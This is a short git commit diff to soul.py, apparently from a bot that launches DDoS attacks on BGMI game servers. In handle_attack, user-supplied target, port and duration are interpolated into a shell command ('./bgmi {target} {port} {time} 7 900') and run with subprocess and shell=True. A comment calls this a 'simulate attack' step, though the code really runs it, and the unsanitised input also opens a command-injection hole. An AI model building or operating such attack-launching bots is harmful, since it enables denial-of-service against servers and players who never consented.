2db708ae687446b03fb6c4cf9c02a32bc79fc432
ddoshbgmi <tradingviewonly0900@gmail.com>
2025-02-15 23:20:22 +0530

    Update soul.py

--- soul.py
+++ soul.py
@@ -301,7 +301,7 @@ def handle_attack(message):
                     start_attack_reply(message, target, port, time)
 
                     # Simulate attack process
-                    full_command = f"./known {target} {port} {time}"
+                    full_command = f"./bgmi {target} {port} {time} 7 900"
                     subprocess.run(full_command, shell=True)
 
                     response = "Attack completed successfully."
